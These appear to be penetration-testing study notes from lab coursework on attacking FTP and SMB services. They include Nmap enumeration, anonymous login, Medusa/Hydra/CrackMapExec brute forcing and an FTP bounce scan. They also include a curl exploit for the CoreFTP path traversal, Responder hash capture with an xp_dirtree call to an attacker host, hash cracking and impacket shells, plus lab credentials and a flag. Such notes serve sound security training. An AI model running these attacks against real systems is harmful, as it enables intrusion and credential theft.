Attacking FTP — Detailed Notes
Attacking FTP

The File Transfer Protocol (FTP) is a standard network protocol designed specifically to transfer files between computers over a TCP/IP network connection. It was one of the earliest protocols developed for the internet and remains widely used in corporate and development environments today. FTP also performs essential directory and file management operations such as changing the working directory, listing files, and renaming or deleting directories and files on the remote server. By default, FTP listens on TCP port 21, which is the control connection port used to send commands between the client and the server. To attack an FTP server, a penetration tester can abuse misconfigurations or excessive privileges, exploit known vulnerabilities, or discover new vulnerabilities through active enumeration and testing. After gaining access to the FTP service, it is critical to be aware of the directory contents so that sensitive or critical information can be identified and extracted during the engagement.

Enumeration

Enumeration is the first and most important phase when targeting an FTP server, as it reveals the software version, configuration, and potential entry points for exploitation. Nmap default scripts triggered by the -sC flag include the ftp-anon script, which automatically checks whether a target FTP server allows anonymous logins without requiring credentials. The version enumeration flag -sV provides detailed and interesting information about FTP services, including the FTP banner, which often contains the version name of the FTP software running on the server. We can use the native ftp client or nc (Netcat) to interact directly with the FTP service and manually probe its responses and behavior. The ftp-anon Nmap script is particularly valuable because anonymous access is a common misconfiguration that can immediately expose sensitive files to an unauthenticated attacker. By default, FTP runs on TCP port 21, but administrators sometimes change this to a non-standard port such as 2121, so port scanning the full range is always recommended.

Nmap

Nmap is the primary tool used for FTP enumeration because it combines port discovery, version detection, and script-based probing into a single powerful command. The command sudo nmap -sC -sV -p 21 192.168.2.142 performs a targeted scan against port 21 on the specified IP address, running default scripts and service version detection simultaneously. The -sC flag activates the default NSE (Nmap Scripting Engine) scripts, which includes ftp-anon that attempts an anonymous login and lists readable files if access is granted. The -sV flag probes the open port to determine the exact service and version information, which is critical for identifying known vulnerabilities in specific FTP software versions. The -p 21 flag restricts the scan to only port 21, making the scan faster and more targeted rather than scanning all 65535 ports. The output of the scan reveals the FTP banner (e.g., vsFTPd 2.3.4), the anonymous login status, directory listings, and file permissions — all of which are actionable intelligence for the attacker.

Command:

sudo nmap -sC -sV -p 21 192.168.2.142

Output:

Starting Nmap 7.91 at 2021-08-10 22:04 EDT
Nmap scan report for 192.168.2.142
Host is up (0.00054s latency).

PORT   STATE SERVICE
21/tcp open  ftp
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--   1 1170  924    31 Mar 28  2001 .banner
| d--x--x--x   2 root  root 1024 Jan 14  2002 bin
| d--x--x--x   2 root  root 1024 Aug 10  1999 etc
| drwxr-srwt   2 1170  924  2048 Jul 19 18:48 incoming [NSE: writeable]
| d--x--x--x   2 root  root 1024 Jan 14  2002 lib
| drwxr-sr-x   2 1170  924  1024 Aug  5  2004 pub
|_Only 6 shown. Use --script-args ftp-anon.maxlist=-1 to see all.

The ftp-anon script confirms anonymous login is allowed (FTP response code 230 means login successful), and the incoming directory is flagged as writable, which is a critical finding because it allows file uploads without authentication. The permissions column (e.g., -rw-r--r--) reveals exactly what the anonymous user can read, write, or execute in each listed file and directory.

Misconfigurations

Misconfigurations in FTP services are among the most common and dangerous security weaknesses found during penetration testing engagements in real-world environments. Anonymous authentication is one such misconfiguration where the FTP server is set up to allow any user to log in using the username anonymous and no password, or any string as the password (some servers accept an email address format). This becomes extremely dangerous for a company if read and write permissions have not been correctly restricted for the anonymous user, because the server may be exposing sensitive company data to anyone on the internet or internal network. With anonymous login access, the attacker could discover sensitive information such as credentials, configuration files, database backups, or source code stored carelessly in publicly accessible FTP directories. Beyond downloading sensitive information, write permissions would allow the attacker to upload malicious scripts, web shells, or payloads that could be triggered through other vulnerabilities such as path traversal in a web application. Exploiting other vulnerabilities in combination with FTP misconfigurations — such as executing an uploaded PHP web shell via a path traversal — greatly amplifies the impact of what might otherwise seem like a low-risk misconfiguration.

Anonymous Authentication

Anonymous authentication is the act of logging into an FTP server without providing real credentials, using the username anonymous and either no password or any arbitrary string as the password. To perform this, a tester runs the ftp command followed by the target IP address, and when prompted for a username, enters anonymous — when prompted for a password, simply presses Enter or types any string. The server responds with code 230 Login successful, confirming that the anonymous user has been granted access to the FTP service and its directory structure. Once inside, standard Linux-like navigation commands are available: ls lists directory contents, cd changes directories, get <filename> downloads a single file, and mget <pattern> downloads multiple files matching a pattern. For upload operations, put <filename> uploads a single local file to the FTP server, and mput handles multiple file uploads in a single operation — both are critical attack vectors when write permissions are misconfigured. The help command inside the FTP client session prints a list of all available FTP commands, which is useful when working with unfamiliar FTP implementations or non-standard servers.

Step-by-Step — Performing Anonymous FTP Login:

Step 1 — Connect to the FTP server:

ftp 192.168.2.142

This initiates a TCP connection to port 21 on the target IP. The server responds with its banner (e.g., 220 (vsFTPd 2.3.4)), confirming the service is alive and revealing the software version.

Step 2 — Enter the anonymous username:

Name (192.168.2.142:kali): anonymous

The server responds with 331 Please specify the password, indicating it accepts the anonymous username and is waiting for a password to proceed.

Step 3 — Enter any password (or blank):

Password: [press Enter]

The server responds with 230 Login successful, confirming anonymous access is granted. The server also reports the remote system type (UNIX) and the transfer mode (binary).

Step 4 — List the directory contents:

ftp> ls

The server responds with 150 Here comes the directory listing and then displays all files and directories. In this case it reveals test.txt with its size and timestamp.

Step 5 — Download a file:

ftp> get test.txt

This downloads the file test.txt from the remote FTP server to the current local working directory on the attacker's machine, which can then be read for sensitive content.

Output observed during lab session (non-standard port 2121):

ftp -P 2121 anonymous@10.129.203.6
Connected to 10.129.203.6.
220 ProFTPD Server (InlaneFTP) [10.129.203.6]
331 Anonymous login ok, send your complete email address as your password
Password:
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||22514|)
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 ftp   ftp   1959 Apr 19  2022 passwords.list
-rw-rw-r--   1 ftp   ftp     72 Apr 19  2022 users.list

In this lab scenario, the FTP server was running on the non-standard port 2121, so the -P 2121 flag was used to specify the custom port rather than the default port 21. The server identifies itself as ProFTPD running with the label InlaneFTP, and the response 220 confirms the server is ready to accept connections from clients. The anonymous login was accepted with code 230, granting restricted access to the server's directory without requiring real credentials. Two highly sensitive files were discovered in the directory: passwords.list (1959 bytes) and users.list (72 bytes), both of which are prime targets for download and use in further attacks such as brute-forcing other services. The -rw-rw-r-- permissions on users.list indicate that even the FTP group can write to it, which is an additional misconfiguration that could be abused. Both files would be downloaded using get passwords.list and get users.list for offline analysis and use in credential attacks.

Protocol Specifics Attacks

Protocol-specific attacks target the inherent behaviors, commands, and design decisions of the FTP protocol rather than individual software bugs or implementation errors alone. It is essential to understand that we are not attacking the FTP protocol specification itself, but rather the services and software implementations that use the protocol and process its commands in different ways. Because there are dozens of different FTP server software implementations — such as vsFTPd, ProFTPD, FileZilla Server, and CoreFTP — each processes protocol commands differently, creating unique attack surfaces per implementation. These attacks take advantage of how specific FTP commands, connection modes, and authentication mechanisms behave in poorly configured or outdated environments. Two major protocol-specific attacks against FTP are brute-forcing login credentials and the FTP bounce attack, both of which exploit the protocol's native command set and connection architecture. Understanding these attacks requires knowing how FTP establishes control connections (port 21) and data connections (passive or active mode), because both channel types are involved in crafting these attacks effectively.

Brute Forcing

Brute forcing FTP login credentials is the technique of systematically trying large numbers of username and password combinations until the correct pair is found and access is granted. When anonymous authentication is not available or has been disabled, brute forcing becomes one of the primary methods to gain unauthorized access to an FTP server using tools designed for this purpose. Medusa is a fast, parallel, and modular login brute-forcer that supports many protocols including FTP, SSH, HTTP, and SMB, making it a versatile tool for credential attacks across multiple services. The -u option specifies a single username to target (e.g., -u fiona), while -U accepts a file containing a list of multiple usernames to try in sequence. The -P option takes a path to a wordlist file containing passwords to try — a common choice is /usr/share/wordlists/rockyou.txt, which contains over 14 million commonly used passwords. The -M option specifies the protocol module to use (in this case ftp), and the -h option specifies the target hostname or IP address where the FTP service is running.

Step-by-Step — Brute Forcing FTP with Medusa:

Step 1 — Identify the target username:
Before running Medusa, a known or suspected username must be available. In this case fiona was identified through prior enumeration such as reading a users.list file discovered on an anonymous FTP server.

Step 2 — Select the wordlist:
The rockyou.txt wordlist located at /usr/share/wordlists/rockyou.txt is chosen because it contains millions of real-world leaked passwords and is highly effective against accounts using common passwords.

Step 3 — Run the Medusa brute force command:

medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp
-u fiona — targets the specific username fiona
-P /usr/share/wordlists/rockyou.txt — uses the rockyou wordlist as the password list
-h 10.129.203.7 — sets the target FTP server IP address
-M ftp — tells Medusa to use its FTP module for the attack

Step 4 — Monitor the output:
Medusa displays each attempt in real time showing the host, user, and password being tested. When a valid credential pair is found, it outputs ACCOUNT FOUND with the successful password.

Output:

ACCOUNT FOUND: [ftp] Host: 10.129.203.7 User: fiona Password: family [SUCCESS]

The password family was found for user fiona after iterating through the rockyou wordlist. This credential can now be used to log into the FTP server with ftp 10.129.203.7 and entering fiona / family at the prompts. Note that most modern applications implement account lockout, rate limiting, or CAPTCHA to prevent brute-force attacks, so Password Spraying (trying one common password against many users) is often a more effective and stealthy alternative in hardened environments.

FTP Bounce Attack

The FTP bounce attack is a network attack technique that exploits the FTP protocol's PORT command to make an FTP server act as a proxy and send traffic to other internal hosts that may not be directly accessible to the attacker. The attack works because the FTP PORT command was designed to allow the client to specify an arbitrary IP address and port for the data connection, which means a malicious client can tell the FTP server to connect to a third-party host instead of the client itself. In a typical scenario, the attacker has access to a publicly exposed FTP server (FTP_DMZ) but wants to scan or reach an internal host (Internal_DMZ) that is behind a firewall and not directly accessible from the internet. By using the exposed FTP server as a bounce point, the attacker can relay port scan traffic through it to discover open ports on the internal host, effectively using the FTP server as a scanning proxy. Nmap provides the -b flag specifically for performing FTP bounce attacks, which takes the format -b <user>:<pass>@<ftp-server> followed by the target IP to scan through the bounce server. Modern FTP servers include protections that prevent bounce attacks by default, but misconfigured or outdated FTP servers may still be vulnerable, making this a relevant technique in legacy environments.

Step-by-Step — FTP Bounce Attack with Nmap:

Step 1 — Identify the exposed FTP server:
The attacker discovers a publicly reachable FTP server at 10.10.110.213 that allows anonymous login and has not disabled the PORT command abuse protection.

Step 2 — Identify the internal target:
Through prior reconnaissance, the internal host 172.17.0.2 is identified as a target whose open ports need to be discovered, but it is not directly reachable from the attacker's machine.

Step 3 — Run the Nmap FTP bounce scan:

nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2
-Pn — skips host discovery (treats the host as alive without pinging it first)
-v — enables verbose output for detailed scan progress information
-n — disables DNS resolution to speed up the scan
-p80 — targets only port 80 on the internal host
-b anonymous:password@10.10.110.213 — uses the FTP server at 10.10.110.213 with anonymous credentials as the bounce proxy

Step 4 — Interpret the results:

PORT   STATE  SERVICE
80/tcp open   http

Nmap confirms that port 80 is open on the internal host 172.17.0.2, information obtained entirely by routing the scan through the FTP bounce server without directly touching the internal target from the attacker's machine.

Latest FTP Vulnerabilities

Understanding the latest FTP vulnerabilities requires analyzing both the technical flaw in the software and the conceptual attack pattern it enables, so that testers can generalize the knowledge to similar vulnerabilities in other services. In this section, the focus is on CVE-2022-22836, a vulnerability affecting CoreFTP before build 727, which is an FTP service that does not correctly process the HTTP PUT request, leading to authenticated directory/path traversal and arbitrary file write. The vulnerability arises because the CoreFTP service accepts HTTP PUT requests in addition to the standard FTP POST requests for uploading files, but fails to properly validate or restrict the file path provided in the PUT request. This path validation failure allows an authenticated attacker to use directory traversal sequences (../) in the path to write files outside the directory the service is intended to access — including sensitive system directories. The exploit is remarkably simple and requires only a single cURL command, making it accessible even to low-skill attackers who have obtained valid FTP credentials. Understanding this vulnerability teaches the broader concept of how improper input validation in file path handling leads to unauthorized write access, a pattern that applies to many web applications and file-handling services beyond just FTP.

The Concept of the Attack

The CoreFTP vulnerability is fundamentally a path traversal combined with arbitrary file write, triggered by sending a crafted HTTP PUT request through the FTP service's built-in HTTP handling capability. The FTP service was designed to process HTTP POST requests for file uploads, but it also accepts HTTP PUT requests — and critically, it fails to sanitize the file path provided in the PUT request before writing to disk. An attacker who has valid credentials can craft a PUT request with a path like /../../../../../whoops, which uses directory traversal sequences to escape the restricted directory and write a file anywhere on the system the service has OS-level write permissions to. The cURL tool is used to craft and send this raw HTTP PUT request with basic authentication, custom headers, arbitrary binary data as the file content, and the traversal path — all in one command. The --path-as-is flag in cURL is essential because without it, cURL would automatically normalize and clean the path, removing the ../ traversal sequences before sending the request, which would cause the exploit to fail. The attack is broken into two logical phases: first the Directory Traversal phase where the application's path restrictions are bypassed, and second the Arbitrary File Write phase where the attacker's chosen content is written to a location of their choosing on the target system.

The Exploit Command:

curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> \
--data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops

Each flag explained:

-k — disables SSL certificate verification, allowing the connection to proceed even with self-signed or invalid certificates
-X PUT — specifies the HTTP method as PUT, which is the trigger for the vulnerable code path in CoreFTP
-H "Host: <IP>" — sets the HTTP Host header to the target IP address, required for the HTTP request to be properly routed
--basic -u <username>:<password> — sends HTTP Basic Authentication credentials required to authenticate to the CoreFTP service
--data-binary "PoC." — specifies the content to write into the file; "PoC." is a proof-of-concept string confirming the write was successful
--path-as-is — instructs cURL NOT to normalize the URL path, preserving the ../ sequences that perform the directory traversal
https://<IP>/../../../../../../whoops — the path with traversal sequences escaping the restricted directory and naming the output file whoops
Directory Traversal

Directory traversal is the first phase of the CoreFTP CVE-2022-22836 exploit, during which the attacker bypasses the application's intended directory restrictions by injecting path traversal sequences into the file path parameter of the HTTP PUT request. The FTP service is configured to serve files only from a specific directory on the server, and under normal circumstances, users should not be able to read or write files outside of that directory. However, because the service fails to validate or sanitize the path provided in the PUT request, it processes the ../../ sequences literally, navigating upward through the directory tree with each ../ pair until it reaches the root or another accessible location. The application does perform an authorization check, but this check only verifies whether the user is allowed in the originally designated folder — once the traversal breaks out of that folder, the authorization restriction no longer applies because the check was tied to the starting path, not the resolved path. This is a fundamental design flaw where security controls are applied to input before path resolution rather than after, meaning the resolved final path is never validated against access policies.

Step-by-Step — Directory Traversal Phase:

Step	Action	Category
1	User specifies HTTP PUT request with ../../../../../../whoops as the path, which includes escape sequences to break out of the restricted area	Source
2	The HTTP PUT request, file contents, and the unvalidated traversal path are accepted and processed by the CoreFTP service	Process
3	The application checks authorization only against the original restricted folder — since the path has escaped that folder via traversal, the restriction is bypassed entirely	Privileges
4	The resolved destination path outside the restricted directory is passed to the next process responsible for writing the file content to disk	Destination
Arbitrary File Write

Arbitrary file write is the second phase of the exploit, which begins immediately after the directory traversal has successfully bypassed the path restrictions and the service is now ready to write content to an unrestricted location on the filesystem. In this phase, the same information the attacker provided in the original cURL command — the filename (whoops) and the binary content (PoC.) — serves as the input that gets written directly to the filesystem at the traversal-resolved path. The CoreFTP service, having already bypassed its own access controls during the traversal phase, proceeds to execute the file write operation with whatever OS-level permissions the FTP service process is running under on the target system. Because all path restrictions were bypassed in the previous phase, the service approves the write without any additional validation, treating the resolved path as a legitimate write destination. The result is that a file named whoops is created on the target system at whatever location the traversal sequences resolved to, containing the content "PoC." supplied by the attacker in the --data-binary flag.

Step-by-Step — Arbitrary File Write Phase:

Step	Action	Category
5	The filename whoops and content "PoC." from the original cURL command are used as the write source	Source
6	The CoreFTP process takes the specified filename and content and proceeds to execute the file write operation to the resolved path	Process
7	Since all restrictions were bypassed during the traversal phase, the service approves writing the content to the specified file without further checks	Privileges
8	The file whoops with content "PoC." is created on the local filesystem of the target system at the traversal-resolved path	Destination

Verification on the Target System:

After the exploit completes successfully, the file can be confirmed by checking the target system's filesystem:

C:\> type C:\whoops

PoC.

The command type C:\whoops on Windows is equivalent to cat on Linux — it prints the contents of the file to the terminal. The output PoC. confirms that the arbitrary file write was successful, the file was created outside the restricted FTP directory, and the attacker has demonstrated the ability to write arbitrary content to arbitrary locations on the target system — which in a real attack could mean writing a web shell, a scheduled task script, or overwriting a critical configuration file.

Attacking SMB Services — Complete Study Notes
1. Introduction to SMB Attacks

Server Message Block (SMB) is a network file sharing protocol used primarily in Windows environments for sharing files, printers, and other resources across a network. It operates on TCP port 445 and older versions also used TCP/139 with NetBIOS. SMB is one of the most commonly attacked services in penetration testing because it is almost always present in Windows environments and has historically had numerous critical vulnerabilities. Beyond file sharing, SMB handles authentication, and this authentication process can be abused to capture password hashes, relay credentials, or brute-force usernames and passwords. Understanding SMB attacks is fundamental to Windows and Active Directory penetration testing, and the techniques learned here apply directly to real-world engagements.

2. SMB Protocol Versions

Understanding which version of SMB is running on a target is critical because different versions have different vulnerabilities and attack surfaces. SMBv1 is the oldest and most dangerous version — it is the protocol exploited by EternalBlue (MS17-010) which powered WannaCry ransomware. SMBv2 and SMBv3 are more secure but still vulnerable to credential capture and relay attacks. Many tools like Hydra only support SMBv1 for brute-forcing, which means you need to use different tools like CrackMapExec when the target runs only SMBv2/v3. Always check which version is supported before choosing your attack tool.

Version	Notes
SMBv1	Legacy, dangerous, exploited by EternalBlue, often disabled
SMBv2	Introduced in Windows Vista, more secure
SMBv3	Introduced in Windows 8/Server 2012, encryption support
3. Enumeration of SMB Services
3.1 Nmap SMB Enumeration

Before attacking SMB you must enumerate it thoroughly to understand what you're dealing with. Nmap has built-in scripts specifically for SMB that can reveal OS version, hostname, domain membership, SMB signing status, supported dialects, and whether dangerous features like SMBv1 or null sessions are enabled. This information directly shapes your attack strategy — for example, if SMB signing is disabled, relay attacks become possible. Always run enumeration before jumping into exploitation, as it saves time and helps you choose the right attack.

bash
nmap -p 445 -sV --script smb-security-mode,smb2-security-mode,smb-os-discovery 10.129.203.6

Full script scan:

bash
nmap -p 139,445 --script=smb-vuln* 10.129.203.6

What to look for:

SMB signing enabled/disabled
SMBv1 support
OS and hostname
Null session support
Known vulnerabilities (MS17-010, MS08-067)
3.2 Enumerate Shares with smbclient
bash
# List all shares (null session)
smbclient -L //10.129.203.6 -N

# List shares with credentials
smbclient -L //10.129.203.6 -U jason%'34c8zuNBo91!@28Bszh'
-L — list available shares
-N — no password (null session)
-U user%pass — provide credentials
3.3 Enumerate with CrackMapExec
bash
crackmapexec smb 10.129.203.6 --shares -u jason -p '34c8zuNBo91!@28Bszh' -d .

CrackMapExec provides richer output than smbclient and shows share permissions, whether the account has admin rights, and OS details all in one command.

4. SMB Null Sessions
4.1 What is a Null Session

A null session is an unauthenticated connection to an SMB service — meaning you connect without providing any username or password at all. This was a major vulnerability in older Windows systems (Windows 2000, XP, Server 2003) where null sessions allowed attackers to enumerate users, groups, shares, and policies anonymously. While modern Windows systems disable null sessions by default, they still appear frequently in legacy environments, misconfigured servers, and Linux Samba installations. Always test for null sessions first as they require no credentials and can provide a massive amount of information for free.

bash
# Test null session with smbclient
smbclient //10.129.203.6/share -N

# Test with crackmapexec
crackmapexec smb 10.129.203.6 -u '' -p ''
5. Brute-Forcing SMB Credentials
5.1 Why Brute-Force SMB

When you don't have valid credentials, brute-forcing SMB is a common technique to gain initial access. SMB authentication is exposed directly over the network, making it a natural target for password spraying and brute-force attacks. However, brute-forcing must be done carefully — many environments have account lockout policies that will lock accounts after a certain number of failed attempts. Always check the lockout policy before launching a full brute-force attack. Password spraying (trying one password against many users) is safer than brute-forcing a single account with many passwords.

5.2 Brute-Forcing with Hydra

Hydra's SMB module only supports SMBv1. If the target has disabled SMBv1 you will get an error and must use a different tool.

bash
# Single username, password list
hydra -l jason -P password.list 10.129.203.6 smb

# Multiple usernames, password list
hydra -L users.list -P passwords.list 10.129.203.6 smb

Common error and meaning:

[ERROR] target smb://10.129.203.6:445/ does not support SMBv1

This means the target only supports SMBv2/v3 — switch to CrackMapExec.

5.3 Brute-Forcing with CrackMapExec

CrackMapExec supports modern SMB versions and is the preferred tool for SMB brute-forcing. It also immediately tells you if an account has administrator privileges via the (Pwn3d!) tag in the output, saving you the step of manually testing admin access after finding credentials.

bash
# Single user, password list
crackmapexec smb 10.129.203.6 -u jason -p password.list --continue-on-success

# Multiple users and passwords
crackmapexec smb 10.129.203.6 -u users.list -p passwords.list --continue-on-success

# IMPORTANT: If password contains @ symbol, add -d . to prevent domain confusion
crackmapexec smb 10.129.203.6 -u jason -p '34c8zuNBo91!@28Bszh' -d .

Output meanings:

[+] — valid credentials found
[-] — invalid credentials
(Pwn3d!) — account has admin rights on the target
5.4 Brute-Forcing with Medusa

Medusa is another brute-forcing tool similar to Hydra. It requires the SMB module to be properly installed. If the module is missing you'll get a "cannot open shared object file" error, in which case fall back to CrackMapExec.

bash
medusa -u jason -P password.list -h 10.129.203.6 -M smb

Common error:

Couldn't load "smb" [/usr/lib/x86_64-linux-gnu/medusa/modules/smb.mod: cannot open shared object file]

Fix: switch to CrackMapExec or Hydra.

6. Connecting to SMB Shares
6.1 Connect with smbclient

Once you have valid credentials, smbclient lets you browse and interact with SMB shares like an FTP client. You can list files, download them, upload them, and navigate directories. The syntax requires double forward slashes for the share path — a common mistake is using single backslashes which causes a "not enough '' characters" error.

bash
# Correct syntax — use forward slashes
smbclient //10.129.203.6/GGJ -U jason%'34c8zuNBo91!@28Bszh'

# Prompt for password separately
smbclient //10.129.203.6/GGJ -U jason

Common smbclient error:

\10.129.203.6GGJ: Not enough '\' characters in service

Fix: use // not \ in the path.

6.2 smbclient Commands Inside the Shell

Once connected you get an smb: \> prompt:

bash
ls              # list files and directories
get filename    # download a file
put filename    # upload a file
cd directory    # change directory
pwd             # show current directory
mkdir dirname   # create directory
del filename    # delete file
exit            # disconnect
6.3 Mount SMB Share (Linux)
bash
sudo mount -t cifs //10.129.203.6/GGJ /mnt/smb -o username=jason,password='34c8zuNBo91!@28Bszh'

This mounts the share to /mnt/smb so you can interact with it using normal Linux commands.

7. Capturing SMB Hashes with Responder
7.1 What is Responder and How It Works

Responder is a powerful tool that listens on the network for LLMNR (Link-Local Multicast Name Resolution), NBT-NS (NetBIOS Name Service), and MDNS broadcast queries. When a Windows machine fails to resolve a hostname via DNS, it falls back to broadcasting LLMNR/NBT-NS queries to the local network. Responder answers these broadcasts pretending to be the requested host, which causes the victim machine to attempt SMB authentication against Responder — sending its NTLMv2 hash in the process. This hash can then be cracked offline or relayed to authenticate to other services. Responder is most effective on local network segments.

bash
sudo responder -I tun0
-I tun0 — listen on the tun0 interface (your VPN/HTB interface)

Responder captures hashes automatically when Windows machines on the network attempt to authenticate to non-existent hosts.

7.2 Captured Hash Format

The captured NTLMv2 hash looks like this:

[SMB] NTLMv2-SSP Username : WINSRV02\mssqlsvc
[SMB] NTLMv2-SSP Hash     : mssqlsvc::WIN-02:aaaaaaaaaaaaaaaa:66a7cb0df59339f0...

Copy the entire hash line starting from mssqlsvc:: and save it to a file for cracking.

7.3 Force Hash Capture via MSSQL xp_dirtree

When you have MSSQL access, you can actively force the server to authenticate to your Responder/smbserver, rather than waiting passively. This is a targeted and reliable way to capture the service account hash without needing to be on the same local network segment as the victim.

Step 1 — Start Responder or impacket-smbserver:

bash
# Option A
sudo responder -I tun0

# Option B
sudo impacket-smbserver share ./ -smb2support

Step 2 — Trigger from inside MSSQL:

sql
EXEC master..xp_dirtree '\\10.10.14.127\share\'
GO
8. Cracking Captured NTLMv2 Hashes
8.1 Why Crack Hashes Offline

NTLMv2 hashes captured by Responder or impacket-smbserver cannot be used directly for Pass-the-Hash attacks — they must be cracked to recover the plaintext password. Offline cracking is fast, stealthy (no network traffic generated), and does not trigger account lockout policies. Tools like John the Ripper and Hashcat use wordlists, rules, and brute-force techniques to recover passwords from hashes. The larger and better-quality your wordlist, the higher your chance of success.

8.2 Crack with John the Ripper
bash
# First decompress rockyou if needed
sudo gunzip /usr/share/wordlists/rockyou.txt.gz

# Crack the hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash

# Show cracked passwords
john --show --format=netntlmv2 hash
8.3 Crack with Hashcat
bash
hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
-m 5600 — hash type for NTLMv2
9. SMB Relay Attacks
9.1 What is an SMB Relay Attack

Instead of cracking a captured NTLMv2 hash, you can relay it directly to another machine on the network to authenticate as that user — without ever knowing the plaintext password. This works when SMB signing is disabled on the target, which is the default on workstations (but not domain controllers). The attack flow is: victim authenticates to your Responder → you relay those credentials to a target machine → you get authenticated access. This is extremely powerful in internal network penetration tests and can lead to full domain compromise.

Requirements for relay attack:

SMB signing must be disabled on the target
The relayed user must have admin rights on the target
9.2 Check if SMB Signing is Disabled
bash
nmap -p 445 --script smb2-security-mode 10.129.203.6
crackmapexec smb 10.129.203.6 --gen-relay-list targets.txt
10. Getting a Shell After SMB Compromise
10.1 Using impacket-psexec

Once you have valid SMB credentials with administrator privileges, impacket-psexec gives you a full SYSTEM-level shell on the target. It works by uploading a service executable to the target via SMB, starting it as a Windows service, and connecting back to give you an interactive shell. This requires the account to have write access to at least one share and the ability to create services — typically admin accounts.

bash
impacket-psexec jason:'34c8zuNBo91!@28Bszh'@10.129.203.6
10.2 Using impacket-smbexec
bash
impacket-smbexec jason:'34c8zuNBo91!@28Bszh'@10.129.203.6

smbexec is stealthier than psexec because it doesn't upload a binary — it uses Windows service control manager to run commands.

10.3 Using impacket-wmiexec
bash
impacket-wmiexec jason:'34c8zuNBo91!@28Bszh'@10.129.203.6

wmiexec uses Windows Management Instrumentation instead of SMB for command execution — useful when SMB execution is blocked but WMI is accessible.

10.4 Using CrackMapExec for Command Execution
bash
crackmapexec smb 10.129.203.6 -u jason -p '34c8zuNBo91!@28Bszh' -d . -x 'whoami'
-x — execute a command and return output
11. Special Characters in Passwords — Bash Gotchas
11.1 The Problem with Special Characters

Special characters in passwords cause serious issues when passed on the Linux command line. The ! character triggers bash history expansion, the @ symbol can be interpreted as a domain separator by tools like CrackMapExec, and $ gets interpreted as a variable. These issues cause authentication failures even when you have the correct password — the tool receives a mangled version of it. This is one of the most common reasons valid credentials appear to fail during testing.

11.2 Solutions
bash
# Wrap in single quotes to prevent bash interpretation
crackmapexec smb 10.129.203.6 -u jason -p '34c8zuNBo91!@28Bszh' -d .

# Use $'' syntax for complex escaping
crackmapexec smb 10.129.203.6 -u jason -p $'34c8zuNBo91!@28Bszh' -d .

# The -d . flag prevents @ being parsed as domain separator
crackmapexec smb 10.129.203.6 -u jason -p 'password@domain' -d .
12. Finding SSH Keys via SMB
12.1 Why SSH Keys May Be on SMB Shares

System administrators often store SSH private keys, configuration files, scripts, and credentials on shared network drives for convenience or backup purposes. If you gain access to an SMB share, always enumerate all files carefully — especially hidden files and files in user home directories. Finding an id_rsa private key on an SMB share immediately gives you SSH access to any system where the corresponding public key is authorized, bypassing password authentication entirely.

12.2 Download and Use an SSH Key Found on SMB
bash
# Inside smbclient - download the key
smb: \> ls
smb: \> get id_rsa

# Exit smbclient, then set correct permissions
chmod 600 id_rsa

# SSH using the private key
ssh -i id_rsa jason@10.129.203.6

Why chmod 600 is required: SSH refuses to use a private key that is readable by other users — it considers it insecure and will throw a "Permissions too open" error.

12.3 Crack a Password-Protected SSH Key

If the id_rsa key has a passphrase:

bash
# Convert key to crackable hash format
ssh2john id_rsa > hash.txt

# Crack with john
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
13. Lab Assessment — Complete Walkthrough
13.1 Task 1 — Brute-Force FTP on Port 2121 (robin)

The target was running FTP on a non-standard port 2121 instead of the default port 21. Standard tools would fail because they target port 21 by default. Hydra's -s flag overrides the default port. We also needed to use -L (lowercase) for a plain text username list rather than -U which expects Hydra's special format.

Step 1 — Run Hydra against FTP on port 2121:

bash
hydra -L users.list -P passwords.list -s 2121 10.129.203.6 ftp

Result:

[2121][ftp] host: 10.129.203.6   login: robin   password: 7iz4rnckjsduza7

Step 2 — Connect to FTP:

bash
ftp 10.129.203.6 2121
# Username: robin
# Password: 7iz4rnckjsduza7
13.2 Task 2 — Brute-Force SMB (jason) and Find SSH Key

The target's SMB service rejected Hydra because it only supported SMBv2/v3, not SMBv1. Medusa failed because its SMB module wasn't installed. CrackMapExec was the solution, but passwords containing @ caused a domain parsing issue that required the -d . flag.

Step 1 — Hydra fails (SMBv1 not supported):

bash
hydra -l jason -P password.list 10.129.203.6 smb
# ERROR: target does not support SMBv1

Step 2 — Medusa fails (module missing):

bash
medusa -u jason -P password.list -h 10.129.203.6 -M smb
# ERROR: Couldn't load "smb" module

Step 3 — CrackMapExec with -d . flag:

bash
crackmapexec smb 10.129.203.6 -u jason -p password.list -d . --continue-on-success

Result:

[+] .\jason:34c8zuNBo91!@28Bszh

Step 4 — Connect to SMB share and download id_rsa:

bash
smbclient //10.129.203.6/GGJ -U jason%'34c8zuNBo91!@28Bszh'
smb: \> ls
smb: \> get id_rsa

Step 5 — SSH using the private key:

bash
chmod 600 id_rsa
ssh -i id_rsa jason@10.129.203.6

Step 6 — Read the flag:

bash
ls
cat flag.txt
# HTB{SMB_4TT4CKS_2349872359}
13.3 Key Lessons Learned from the Lab

Every mistake made during the lab taught an important lesson that applies to real penetration tests. These lessons are worth memorizing because you will encounter every single one of them again in future assessments. The @ symbol issue with CrackMapExec alone has caused countless testers to believe they have wrong credentials when in fact they have the right ones.

Always use -s in Hydra to specify non-standard ports (FTP on 2121, SSH on 2222, etc.)
Use -L not -U in Hydra for plain text username lists
Hydra SMB only works on SMBv1 — if target uses SMBv2/v3, switch to CrackMapExec
Passwords with @ need -d . in CrackMapExec to prevent domain parsing confusion
Single quotes in bash prevent special characters like ! from being interpreted by the shell
Always chmod 600 id_rsa before using an SSH private key or SSH will refuse it
Check all shares when you get SMB access — sensitive files like SSH keys are often stored there
--continue-on-success in CrackMapExec prevents it from stopping after finding one match
(Pwn3d!) in CrackMapExec output means the account has admin rights — immediately try psexec/wmiexec

Attacking SQL Databases — Complete Final Notes
1. Introduction to SQL Database Attacks

